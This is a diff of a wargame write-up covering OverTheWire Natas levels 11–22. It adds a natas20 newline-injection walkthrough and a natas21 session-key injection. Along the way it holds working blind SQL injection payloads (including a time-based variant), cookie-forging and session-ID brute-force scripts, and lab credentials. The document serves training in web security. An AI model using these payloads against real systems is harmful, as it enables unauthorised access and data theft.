@@ -362,7 +362,7 @@ echo base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
 // b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
 ```
 
-Step 2: We create `solve.py` to generate new cookie.
+Step 2: We create `natas11.py` to generate new cookie.
 
 ```python
 #!/usr/bin/python3
@@ -392,7 +392,7 @@ print('cookie:', base64.b64encode(cookie.encode()))
 ```
 
 ```
-python3 solve.py
+python3 natas11.py
 
 data: {"showpassword":"no","bgcolor":"#ffffff"}
 xoring: b'\nUK"\x1e\x00H+\x02\x04O%\x03\x13\x1apS\x19Wh]UZ-\x12\x18T%\x03U\x02hR\x11^,\x17\x11^h\x0c'
@@ -733,7 +733,7 @@ Step 3: Brute-force binary char:
 username=natas16%22+and+substring(password,§1§,1)+LIKE+BINARY+%22§w§ -> Check response `This user exists.` -> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 ```
 
-This following python code `solve.py`:
+This following python code `natas15.py`:
 
 ```python
 #!/usr/bin/python3
@@ -779,7 +779,7 @@ for i, char in enumerate(password_lower):
 ```
 
 ```
-python3 solve.py
+python3 natas15.py
 
 password length: 32
 characters: abcdefghijklmnopqrstuvwxyz0123456789
@@ -847,7 +847,7 @@ Because `'African'` is one word in dictionary.txt, if first command return `None
 
 Vice versa, if first command return `123456African` -> the second command return `None`, because the word `123456African` isn't in dictionary.txt and don't show dictionary. Then we can confirm that `123456` is part of the password. Next we will use blind injection to get full password.
 
-This following python code `solve.py`:
+This following python code `natas16.py`:
 
 ```python
 #!/usr/bin/python3
@@ -876,7 +876,8 @@ for i in range(35):
 ```
 
 ```
-python3 solve.py
+python3 natas16.py
+
 characters: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
 password: 8
 password: 8P
@@ -969,7 +970,7 @@ Step 3: Brute-force password char by char
 username=natas18%22+and+substring(password,§1§,1)+like+binary+%22§a§%22+and+sleep(3)%23 -> 
 ```
 
-This following python code `solve.py`:
+This following python code `natas17.py`:
 
 ```python
 #!/usr/bin/python3
@@ -1005,7 +1006,7 @@ for i in range(length):
 ```
 
 ```
-python3 solve.py
+python3 natas17.py
 
 ('password length:', 32)
 ('characters:', 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
@@ -1155,7 +1156,7 @@ Connection: close
 username=test&password=test
 ```
 
-The random session was created, and `PHPSESSID=273` is set in cookie. Because the maximum of `PHPSESSID` is `640`. So we can brute-force 640 times to find the PHPSESSID of admin. This following python code `solve.py`: 
+The random session was created, and `PHPSESSID=273` is set in cookie. Because the maximum of `PHPSESSID` is `640`. So we can brute-force 640 times to find the PHPSESSID of admin. This following python code `natas18.py`: 
 
 ```python
 import requests
@@ -1175,7 +1176,7 @@ for i in range(641):
 ```
 
 ```
-python3 solve.py
+python3 natas18.py
 
 ('admin id:', 119)
 ```
@@ -1188,7 +1189,7 @@ curl --user natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.o
 
 ```
 You are an admin. The credentials for the next level are:<br><pre>Username: natas19
-Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
 ```
 
 ### natas19
@@ -1217,7 +1218,7 @@ Upgrade-Insecure-Requests: 1
 Cache-Control: max-age=0
 ```
 
-The cookie `PHPSESSID=3237332d686f616e67703436` look like HEX format, try decode it we get `273-hoangp46` -> now we can brute-force to find the PHPSESSID of admin with payload `HEX(§640§-admin)`. This following python code `solve.py`:
+The cookie `PHPSESSID=3237332d686f616e67703436` look like HEX format, try decode it we get `273-hoangp46` -> now we can brute-force to find the PHPSESSID of admin with payload `HEX(§640§-admin)`. This following python code `natas19.py`:
 
 ```python
 import requests
@@ -1238,7 +1239,7 @@ for i in range(641):
 ```
 
 ```
-python3 solve.py
+python3 natas19.py
 
 admin id: 281 cookie: 3238312d61646d696e
 ```
@@ -1251,7 +1252,7 @@ curl --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.o
 
 ```
 You are an admin. The credentials for the next level are:<br><pre>Username: natas20
-Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
 ```
 
 ### natas20
@@ -1366,3 +1367,207 @@ if(array_key_exists("name", $_SESSION)) {
 ?>
 
 ```
+
+When we change name to `hoang` and add parameter `?debug=1` into url, the response look like that:
+
+```
+DEBUG: MYREAD 43gs6u90l9seoufajpsn97ag44
+DEBUG: Reading from /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
+DEBUG: Read [name hoang]
+DEBUG: Read []
+You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+
+DEBUG: MYWRITE 43gs6u90l9seoufajpsn97ag44 name|s:5:"hoang";
+DEBUG: Saving in /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
+DEBUG: name => hoang
+```
+
+If we want to login as an admin, we need to set `$_SESSION["admin"]=1` in `print_credentials()` function.
+
+Following `mywrite()` function, this function write data in `$_SESSION` into session_file, each key value pairs on one line:
+
+```php
+foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+```
+
+Following `myread()` function, this function read data from session_file, and set key value pairs to `$_SESSION`:
+
+```php
+foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+```
+
+The content of session_file of admin look like that:
+
+```
+name hoang
+admin 1
+```
+
+We will inject payload to change name and write `admin 1` line into session_file. That is `CRLF injection` with the payload `hoang%0Aadmin%201`
+
+Try access url: `http://natas20.natas.labs.overthewire.org/?name=hoang%0Aadmin%201&debug=1`
+
+Refresh browser to reload `myread()` function, you can see password:
+
+```
+DEBUG: MYREAD 43gs6u90l9seoufajpsn97ag44
+DEBUG: Reading from /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
+DEBUG: Read [name hoang]
+DEBUG: Read [admin 1]
+DEBUG: Read []
+DEBUG: Name set to hoang admin 1
+You are an admin. The credentials for the next level are:
+
+Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+DEBUG: MYWRITE 43gs6u90l9seoufajpsn97ag44 name|s:13:"hoang admin 1";admin|s:1:"1";
+DEBUG: Saving in /var/lib/php5/sessions//mysess_43gs6u90l9seoufajpsn97ag44
+DEBUG: admin => 1
+DEBUG: name => hoang admin 1
+```
+
+### natas21
+
+```php
+<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
+</p>
+
+<?
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas22\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+
+?> 
+```
+
+```php
+<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
+</p>
+<?  
+
+session_start();
+
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+
+if(array_key_exists("debug", $_GET)) {
+    print "[DEBUG] Session contents:<br>";
+    print_r($_SESSION);
+}
+
+// only allow these keys
+$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
+$form = "";
+
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+        $val = $_SESSION[$key];
+        } 
+    else {
+        $_SESSION[$key] = $val;
+        }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+$form .= '<input type="submit" name="submit" value="Update" />';
+$form .= '</form>';
+
+$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
+$example = "<div style='$style'>Hello world!</div>";
+
+?> 
+```
+
+The application save key value pairs from `$_REQUEST` to `$_SESSION` by:
+
+```php
+// if update was submitted, store it
+if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+```
+
+Login as an admin required `$_SESSION["admin"] == 1` -> `$_REQUEST["admin"] == 1`
+
+Custom input form to `<input name="admin" value="1">` -> POST -> get response with parameter `?debug`:
+
+```
+[DEBUG] Session contents:
+Array ( [align] => center [fontsize] => 100% [bgcolor] => yellow [admin] => 1 [submit] => Update )
+```
+
+Oh, `[admin] => 1` is should be ok, let see the response:
+
+```
+GET /index.php?debug HTTP/1.1
+Host: natas21-experimenter.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
+Connection: keep-alive
+Cookie: __utma=176859643.1954634464.1645363414.1646503128.1646533829.12; __utmz=176859643.1646533829.12.8.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=2tfpv93p619l71uffvd1675uh5
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+Get cookie `PHPSESSID=2tfpv93p619l71uffvd1675uh5` and POST to http://natas21.natas.labs.overthewire.org/index.php:
+
+```shell
+curl --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/index.php --cookie "PHPSESSID=2tfpv93p619l71uffvd1675uh5"
+```
+
+```
+You are an admin. The credentials for the next level are:<br><pre>Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+```
+
+### natas22
+
+```php
+<?
+session_start();
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+}
+?>
+
+<?
+    if(array_key_exists("revelio", $_GET)) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas23\n";
+    print "Password: <censored></pre>";
+    }
+?> 
+```
+
